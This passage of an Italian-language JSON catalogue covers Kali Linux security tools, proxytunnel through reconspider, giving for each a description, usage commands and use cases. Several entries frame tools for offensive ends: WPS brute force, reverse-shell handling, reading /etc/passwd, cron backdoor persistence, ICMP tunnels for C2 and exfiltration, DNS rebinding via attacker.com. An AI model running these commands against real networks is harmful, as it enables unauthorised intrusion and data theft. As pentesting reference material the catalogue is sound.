class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>UDP:</strong> non supporta UDP, solo TCP. <strong>DNS leaks:</strong> configurare proxy_dns per evitare leak. <strong>Performance:</strong> latenza aumentata attraverso catene proxy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "proxytunnel",
    "name": "proxytunnel",
    "version": "1.12.3",
    "icon": "../app/icons/proxytunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxytunnel/",
    "desc": "Tunneling SSH attraverso proxy HTTP CONNECT per bypass firewall aziendali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxytunnel</strong> crea tunnel TCP attraverso proxy HTTP che supportano il metodo CONNECT. Permette di stabilire connessioni SSH attraverso proxy aziendali che normalmente bloccano porte non-HTTP, bypassando restrizioni firewall.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP CONNECT:</strong> sfrutta metodo CONNECT per tunnel arbitrari</p><p><strong>Proxy Auth:</strong> supporto autenticazione Basic e NTLM</p><p><strong>SSL Support:</strong> tunnel attraverso proxy HTTPS</p><p><strong>SSH Integration:</strong> configurabile come ProxyCommand in SSH config</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tunnel SSH attraverso proxy\nproxytunnel -p proxy.corp.com:8080 -d ssh.external.com:22\n\n# Con autenticazione proxy\nproxytunnel -p proxy:8080 -P user:pass -d target:22\n\n# In SSH config\n# Host external\n#   ProxyCommand proxytunnel -p proxy:8080 -d %h:%p\nssh external</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>firewall bypass</strong>, SSH outbound da reti aziendali restrittive. Per <strong>remote access</strong>, connessione a sistemi esterni via proxy. Per <strong>exfiltration</strong>, canale di comunicazione attraverso proxy consentiti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Proxy logs:</strong> connessioni CONNECT loggate sul proxy. <strong>DLP:</strong> content inspection può rilevare traffico non-HTTP. <strong>Policy:</strong> bypass di policy aziendali può violare regolamenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pskracker",
    "name": "pskracker",
    "version": "0.3.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pskracker/",
    "desc": "Genera wordlist specifiche per router default password basate su pattern comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PSKracker</strong> genera wordlist ottimizzate per attacchi a password WiFi di default dei router. Basandosi su pattern noti (seriali, MAC address, algoritmi vendor), crea dizionari mirati che hanno alta probabilità di successo contro password factory.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Vendor Patterns:</strong> algoritmi per TP-Link, Netgear, Huawei e altri</p><p><strong>MAC-based:</strong> genera password derivate da MAC address</p><p><strong>Serial Patterns:</strong> pattern basati su numeri seriali</p><p><strong>Optimized Output:</strong> wordlist compatte ma efficaci</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera wordlist per vendor specifico\npskracker -t tplink -m AA:BB:CC:DD:EE:FF\n\n# Output su file\npskracker -t netgear -o wordlist.txt\n\n# Genera tutte le varianti\npskracker -t all -m AA:BB:CC:DD:EE:FF\n\n# Con ESSID noto\npskracker -e \"NETGEAR-5G\" -t netgear</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, attacco rapido a router con password default. Per <strong>security audit</strong>, verifica cambio password factory su dispositivi aziendali. Per <strong>home network</strong>, test sicurezza router personale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Efficacia:</strong> funziona solo se password default non è stata cambiata. <strong>Legal:</strong> attacco a reti WiFi altrui è illegale. <strong>Updates:</strong> vendor modificano algoritmi, tool potrebbe non essere aggiornato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "pspy",
    "name": "pspy",
    "version": "1.2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pspy/",
    "desc": "Monitor processi Linux senza privilegi root per scoprire cronjob e processi nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pspy</strong> è un tool di process monitoring che non richiede privilegi root. Monitora processi in esecuzione, cronjob, e comandi lanciati da altri utenti usando tecniche di filesystem scanning. Ideale per scoprire task schedulati exploitabili per privilege escalation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Unprivileged:</strong> funziona senza root, perfetto per privesc recon</p><p><strong>Process Monitoring:</strong> rileva nuovi processi in tempo reale</p><p><strong>Cron Detection:</strong> identifica cronjob e task schedulati</p><p><strong>Command Logging:</strong> cattura comandi completi con argomenti</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Monitoring base\n./pspy64\n\n# Con scan di /proc più frequente\n./pspy64 -pf -i 100\n\n# Monitoring solo filesystem events\n./pspy64 -f\n\n# Output colorato per processi UID diversi\n./pspy64 -c</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>privilege escalation</strong>, scoprire cronjob vulnerabili o script world-writable. Per <strong>enumeration</strong>, capire quali processi girano sul sistema. Per <strong>persistence detection</strong>, identificare task sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>CPU:</strong> polling frequente può aumentare uso CPU visibilmente. <strong>Detection:</strong> processo pspy stesso visibile in ps. <strong>Static binary:</strong> disponibile come binario statico per facile deploy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "ptunnel",
    "name": "ptunnel",
    "version": "0.72",
    "icon": "../app/icons/ptunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ptunnel/",
    "desc": "Tunneling TCP over ICMP per exfiltration e comunicazione attraverso firewall restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ptunnel</strong> tunnela connessioni TCP attraverso pacchetti ICMP echo request/reply (ping). Permette di bypassare firewall che bloccano TCP/UDP ma permettono ICMP, stabilendo canali di comunicazione nascosti per C2 o exfiltration.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>ICMP Tunneling:</strong> encapsula TCP in pacchetti ICMP</p><p><strong>Proxy Mode:</strong> server proxy per forward connessioni</p><p><strong>Authentication:</strong> password opzionale per accesso al tunnel</p><p><strong>Reliability:</strong> gestione perdita pacchetti e ritrasmissioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (sulla macchina esterna)\nptunnel -x password123\n\n# Client (dalla rete restrittiva)\nptunnel -p server_ip -lp 8000 -da target_ip -dp 22 -x password123\n\n# Poi connessione SSH locale\nssh -p 8000 user@127.0.0.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>firewall bypass</strong>, comunicazione da reti che bloccano tutto tranne ping. Per <strong>exfiltration</strong>, canale nascosto per trasferimento dati. Per <strong>C2</strong>, comunicazione con implant attraverso ICMP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Anomaly:</strong> volume ICMP elevato è anomalo e rilevabile. <strong>DPI:</strong> deep packet inspection può identificare tunnel. <strong>Performance:</strong> bandwidth limitata dal rate ICMP consentito.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pwnat",
    "name": "pwnat",
    "version": "0.3.0",
    "icon": "../app/icons/pwnat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pwnat/",
    "desc": "NAT traversal per connessioni peer-to-peer tra host dietro NAT senza port forwarding.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwnat</strong> permette connessioni peer-to-peer tra host entrambi dietro NAT senza necessità di port forwarding. Usa una tecnica innovativa basata su ICMP time exceeded per stabilire comunicazione bidirezionale attraverso NAT simmetrici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NAT Traversal:</strong> connette host dietro NAT senza configurazione router</p><p><strong>ICMP-based:</strong> usa pacchetti ICMP per hole punching</p><p><strong>No Server:</strong> non richiede server esterno di rendezvous</p><p><strong>TCP Forwarding:</strong> forward porte TCP attraverso NAT</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lato server (dietro NAT)\npwnat -s\n\n# Lato client (dietro altro NAT)\npwnat -c server_public_ip -lp 2222 -dp 22\n\n# Poi SSH al target attraverso tunnel\nssh -p 2222 user@127.0.0.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>remote access</strong>, connessione a sistemi dietro NAT senza port forwarding. Per <strong>pentest</strong>, callback da reti senza outbound filtering. Per <strong>C2</strong>, comunicazione con implant dietro NAT.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Affidabilità:</strong> non funziona con tutti i tipi di NAT. <strong>ICMP:</strong> richiede che ICMP sia permesso outbound. <strong>Detection:</strong> pattern ICMP anomalo può essere rilevato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "pwncat",
    "name": "pwncat",
    "version": "0.1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pwncat/",
    "desc": "Framework post-exploitation Python con shell interattiva, upload/download, persistence.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pwncat</strong> è un framework post-exploitation in Python che fornisce shell interattiva avanzata con funzionalità automatizzate. Trasforma reverse shell basilari in ambienti interattivi completi con upload/download, persistence, e enumeration integrata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shell Enhancement:</strong> upgrade automatico a PTY interattivo</p><p><strong>File Transfer:</strong> upload/download integrati senza tool esterni</p><p><strong>Persistence:</strong> moduli per installazione backdoor automatica</p><p><strong>Enumeration:</strong> raccolta informazioni sistema automatizzata</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener per reverse shell\npwncat-cs -lp 4444\n\n# Connessione a bind shell\npwncat-cs target:4444\n\n# Dalla shell pwncat\nupload local_file /tmp/remote_file\ndownload /etc/passwd ./passwd\n\n# Persistence\nrun persist.cron</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, upgrade di shell basic a ambiente interattivo. Per <strong>CTF</strong>, gestione efficiente di shell multiple. Per <strong>persistence</strong>, installazione automatica backdoor.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dependencies:</strong> richiede Python sul target per funzionalità avanzate. <strong>Persistence:</strong> moduli persistence lasciano artefatti rilevabili. <strong>Logging:</strong> comandi eseguiti loggati in history.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "pyinstxtractor",
    "name": "pyinstxtractor",
    "version": "2025.02",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pyinstxtractor/",
    "desc": "Estrae sorgenti Python da eseguibili PyInstaller per reverse engineering di malware.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pyinstxtractor</strong> estrae il contenuto di eseguibili creati con PyInstaller. Recupera file .pyc compilati, risorse e struttura originale del progetto Python, permettendo reverse engineering di malware e applicazioni packaged con PyInstaller.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Archive Extraction:</strong> estrae tutti i file dal bundle PyInstaller</p><p><strong>PYC Recovery:</strong> recupera bytecode Python compilato</p><p><strong>Resource Extraction:</strong> estrae file di dati e risorse incluse</p><p><strong>Version Detection:</strong> identifica versione PyInstaller usata</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione eseguibile PyInstaller\npython pyinstxtractor.py malware.exe\n\n# Output in directory\ncd malware.exe_extracted/\n\n# Decompilazione PYC (con uncompyle6)\nuncompyle6 main.pyc > main.py</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, reverse engineering di malware Python. Per <strong>CTF</strong>, challenge con eseguibili PyInstaller. Per <strong>security audit</strong>, analisi applicazioni Python distribuite.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Safe:</strong> estrazione è statica, non esegue codice. <strong>Decompilation:</strong> PYC estratti richiedono decompilatore separato. <strong>Obfuscation:</strong> codice potrebbe essere obfuscato post-estrazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "python-ldapdomaindump",
    "name": "python-ldapdomaindump",
    "version": "0.9.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/python-ldapdomaindump/",
    "desc": "Dumpa informazioni Active Directory via LDAP: utenti, gruppi, computer, policy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ldapdomaindump</strong> esegue dump completo di informazioni Active Directory via LDAP. Estrae utenti, gruppi, computer, policy, trust e altre informazioni in formati strutturati (HTML, JSON, grep-friendly) per analisi offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Dump:</strong> estrae tutti gli oggetti AD accessibili</p><p><strong>Multi-format Output:</strong> HTML navigabile, JSON, grep-friendly</p><p><strong>Relationship Mapping:</strong> visualizza membership gruppi e trust</p><p><strong>Offline Analysis:</strong> dati esportabili per analisi senza connessione</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump con credenziali\nldapdomaindump -u 'domain\\user' -p 'password' dc.domain.local\n\n# Output directory specifica\nldapdomaindump -u user -p pass -o ./dump dc.domain.local\n\n# Con LDAPS\nldapdomaindump -u user -p pass --ssl dc.domain.local</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD enumeration</strong>, raccolta completa informazioni dominio. Per <strong>offline analysis</strong>, studio struttura AD senza query ripetute. Per <strong>reporting</strong>, documentazione struttura dominio per clienti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> query LDAP loggate su domain controller. <strong>Volume:</strong> dump completo genera molto traffico. <strong>Credentials:</strong> richiede credenziali di dominio valide.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "qsslcaudit",
    "name": "qsslcaudit",
    "version": "0.8.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/qsslcaudit/",
    "desc": "Testa vulnerabilità SSL/TLS di client verificando accettazione certificati invalidi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>QSSLCAudit</strong> testa la sicurezza di implementazioni SSL/TLS lato client. Verifica se applicazioni accettano certificati invalidi, scaduti, self-signed o con CN errato, identificando vulnerabilità a attacchi MITM.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Certificate Tests:</strong> presenta certificati invalidi in vari modi</p><p><strong>Client Testing:</strong> verifica validazione certificati lato client</p><p><strong>Multiple Scenarios:</strong> expired, wrong CN, self-signed, revoked</p><p><strong>Reporting:</strong> documenta quali certificati vengono accettati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server test\nqsslcaudit\n\n# Test su porta specifica\nqsslcaudit -l 0.0.0.0 -p 8443\n\n# Con test specifici\nqsslcaudit --test-cert-expired --test-cert-self-signed\n\n# Configurare client per connettersi a qsslcaudit</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security audit</strong>, verifica implementazione TLS in applicazioni. Per <strong>app testing</strong>, test mobile app certificate pinning. Per <strong>IoT security</strong>, verifica validazione certificati su dispositivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Controlled:</strong> test su applicazioni proprie o autorizzate. <strong>Setup:</strong> richiede redirect traffico client verso il tool. <strong>Certificate:</strong> genera certificati test automaticamente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "quark-engine",
    "name": "quark-engine",
    "version": "23.9.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/quark-engine/",
    "desc": "Analisi statica APK Android per rilevamento malware tramite regole comportamentali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Quark-Engine</strong> è un sistema di analisi malware Android basato su regole comportamentali. Analizza APK identificando pattern sospetti come esfiltrazione SMS, registrazione chiamate, accesso a contatti con punteggio di rischio e report dettagliati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Behavioral Rules:</strong> oltre 200 regole per pattern malware noti</p><p><strong>Risk Scoring:</strong> punteggio di pericolosità basato su comportamenti</p><p><strong>Call Graph:</strong> visualizzazione flusso chiamate API</p><p><strong>Report Generation:</strong> output JSON, HTML per documentazione</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi APK\nquark -a suspicious.apk -s\n\n# Con report dettagliato\nquark -a suspicious.apk -d\n\n# Output JSON\nquark -a suspicious.apk -o report.json\n\n# Con regole custom\nquark -a suspicious.apk -r custom_rules/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, triage rapido di APK sospetti. Per <strong>app vetting</strong>, verifica sicurezza app prima dell'installazione. Per <strong>threat research</strong>, analisi campagne malware Android.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Static:</strong> analisi statica, non esegue l'APK. <strong>Evasion:</strong> malware avanzato può evadere detection statica. <strong>Updates:</strong> regole richiedono aggiornamenti per nuove varianti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "radare2",
    "name": "radare2",
    "version": "5.9.8",
    "icon": "../app/icons/radare2-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/radare2/",
    "desc": "Framework reverse engineering completo: disassembler, debugger, analisi binaria.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Radare2</strong> è un framework di reverse engineering open-source completo. Include disassembler, debugger, analizzatore binario, editor hex e molto altro. Supporta numerose architetture e formati file con interfaccia CLI potente e scriptabile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-arch:</strong> x86, ARM, MIPS, PowerPC e dozzine di altre architetture</p><p><strong>Disassembly:</strong> disassembler con analisi automatica funzioni</p><p><strong>Debugging:</strong> debugger integrato per analisi dinamica</p><p><strong>Scripting:</strong> r2pipe per automazione in Python, JavaScript, Go</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Apertura binario in analisi\nr2 -A binary\n\n# Comandi comuni\naaa          # Analisi automatica completa\nafl          # Lista funzioni\npdf @main    # Disassembly funzione main\nVV           # Visual mode graph\n\n# Debugging\nr2 -d binary\ndb main      # Breakpoint\ndc           # Continue</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, analisi statica e dinamica di sample. Per <strong>CTF</strong>, reversing di challenge binari. Per <strong>vulnerability research</strong>, analisi binari per bug hunting.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Learning curve:</strong> interfaccia CLI richiede tempo per padroneggiare. <strong>Cutter:</strong> GUI disponibile per chi preferisce interfaccia grafica. <strong>Ghidra:</strong> alternativa per decompilation avanzata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "raven",
    "name": "raven",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/raven/",
    "desc": "Pipelines scanner per GitHub Actions e CI/CD security con detection di poisoning.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Raven</strong> è uno scanner di sicurezza per pipeline CI/CD, focalizzato su GitHub Actions. Identifica vulnerabilità come pipeline poisoning, injection, secrets exposure e misconfigurazioni che permettono supply chain attacks.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pipeline Analysis:</strong> scansiona workflow GitHub Actions per vulnerabilità</p><p><strong>Poisoning Detection:</strong> identifica rischi di pipeline poisoning</p><p><strong>Secrets Exposure:</strong> trova leak di secrets nei workflow</p><p><strong>Injection Risks:</strong> rileva possibilità di code injection</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan repository\nraven scan --repo https://github.com/org/repo\n\n# Scan organizzazione completa\nraven scan --org organization_name\n\n# Output report\nraven scan --repo url --output report.json\n\n# Con token per rate limit\nraven scan --repo url --token ghp_xxxxx</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>supply chain security</strong>, audit pipeline CI/CD. Per <strong>DevSecOps</strong>, integrazione in security review. Per <strong>red team</strong>, identificazione vettori attacco via CI/CD.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API limits:</strong> scan intensivi richiedono token GitHub. <strong>Public repos:</strong> scan di repo pubblici è legale. <strong>Private:</strong> richiede autorizzazione per repo privati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "reaver",
    "name": "reaver",
    "version": "1.6.6",
    "icon": "../app/icons/reaver-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/reaver/",
    "desc": "Brute force WPS PIN per ottenere password WPA/WPA2 su access point vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Reaver</strong> esegue attacchi brute force contro WPS (WiFi Protected Setup) per recuperare la password WPA/WPA2 degli access point. Sfrutta la debolezza del PIN WPS a 8 cifre che può essere crackato in ore invece che anni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WPS Brute Force:</strong> enumera tutti i possibili PIN WPS</p><p><strong>Pixie Dust:</strong> integrazione con pixiewps per crack istantaneo su router vulnerabili</p><p><strong>Rate Limiting Bypass:</strong> tecniche per evitare lockout WPS</p><p><strong>Session Resume:</strong> riprende attacco da ultimo PIN testato</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Mettere interfaccia in monitor mode\nairmon-ng start wlan0\n\n# Attacco WPS standard\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv\n\n# Con Pixie Dust\nreaver -i wlan0mon -b BSSID -K 1\n\n# Delay tra tentativi\nreaver -i wlan0mon -b BSSID -d 2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi pentesting</strong>, recupero password su router con WPS abilitato. Per <strong>security audit</strong>, verifica disabilitazione WPS su infrastruttura. Per <strong>CTF</strong>, challenge wireless con WPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> attacco a reti WiFi non autorizzate è illegale. <strong>Tempo:</strong> brute force completo può richiedere 4-10 ore. <strong>Lockout:</strong> molti router bloccano WPS dopo troppi tentativi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "rebind",
    "name": "rebind",
    "version": "0.3.4",
    "icon": "../app/icons/rebind-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rebind/",
    "desc": "DNS rebinding attack tool per bypass same-origin policy e accesso a servizi interni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rebind</strong> implementa attacchi DNS rebinding per bypassare la same-origin policy dei browser. Permette a JavaScript malevolo di accedere a servizi interni della vittima facendo risolvere un dominio prima all'IP attacker, poi all'IP interno target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DNS Server:</strong> server DNS con risposte TTL basso per rebinding</p><p><strong>Web Server:</strong> serve payload JavaScript per l'attacco</p><p><strong>Internal Access:</strong> bypass same-origin per accesso a servizi LAN</p><p><strong>Configurable:</strong> target IP e porta configurabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server rebind\nrebind --domain attacker.com --target 192.168.1.1 --port 80\n\n# Vittima visita http://malicious.attacker.com\n# JavaScript viene eseguito\n# DNS risolve a IP interno\n# Browser accede a servizio interno</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>internal recon</strong>, accesso a servizi interni da browser vittima. Per <strong>router exploitation</strong>, attacco a pannelli admin router. Per <strong>SSRF via browser</strong>, bypass protezioni same-origin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti:</strong> vittima deve visitare dominio attacker. <strong>Mitigazioni:</strong> browser moderni hanno protezioni parziali. <strong>DNS TTL:</strong> alcuni resolver ignorano TTL bassi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "SSRF"
    ],
    "notes": null
  },
  {
    "id": "recon-ng",
    "name": "recon-ng",
    "version": "5.1.2",
    "icon": "../app/icons/recon-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/recon-ng/",
    "desc": "Framework OSINT modulare con workspace, database e decine di moduli reconnaissance.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Recon-ng</strong> è un framework di reconnaissance modulare con interfaccia stile Metasploit. Fornisce workspace per organizzare progetti, database SQLite per risultati, e decine di moduli per OSINT su domini, email, social media e infrastrutture.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular Architecture:</strong> marketplace di moduli per diverse fonti OSINT</p><p><strong>Workspace:</strong> organizzazione progetti separati con database dedicati</p><p><strong>API Integration:</strong> supporto API Shodan, VirusTotal, Have I Been Pwned</p><p><strong>Reporting:</strong> export risultati in HTML, CSV, JSON</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio recon-ng\nrecon-ng\n\n# Creazione workspace\nworkspaces create target_company\n\n# Installazione modulo\nmarketplace install recon/domains-hosts/hackertarget\n\n# Uso modulo\nmodules load recon/domains-hosts/hackertarget\ninfo\noptions set SOURCE target.com\nrun</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, raccolta organizzata informazioni su target. Per <strong>pentest</strong>, fase reconnaissance strutturata. Per <strong>threat intel</strong>, mappatura infrastruttura di threat actors.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Keys:</strong> molti moduli richiedono chiavi API. <strong>Rate Limiting:</strong> query massive possono essere limitate. <strong>Attribution:</strong> alcune query identificano la sorgente.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "reconspider",
    "name": "reconspider",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/reconspider/",
    "desc": "Recon automation framework con IP/domain lookup, port scan, honeypot detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ReconSpider</strong> è un framework di reconnaissance automation che aggrega informazioni da multiple fonti. Esegue IP lookup, domain intelligence, port scanning, honeypot detection e raccolta informazioni su persone in modo automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Intelligence:</strong> geolocation, ASN, blacklist check</p><p><strong>Domain Recon:</strong> DNS records, WHOIS, subdomains</p><p><strong>Port Scanning:</strong> scan integrato per discovery servizi</p><p><strong>Honeypot Detection:</strong> identifica se target è un honeypot</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio interattivo\npython reconspider.py\n\n# IP lookup\nreconspider --ip 8.8.8.8\n\n# Domain recon\nreconspider --domain target.com\n\n# Honeypot check\nreconspider --honeypot 192.168.1.1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>quick recon</strong>, raccolta rapida informazioni su target. Per <strong>threat hunting</strong>, analisi IP sospetti. Per <strong>pentest prep</strong>, intelligence iniziale prima di engagement.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active scanning:</strong> port scan genera traffico verso target. <strong>API queries:</strong> alcune lookup usano servizi esterni. <strong>Aggregation:</strong> combina risultati da fonti pubbliche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "redsnarf",
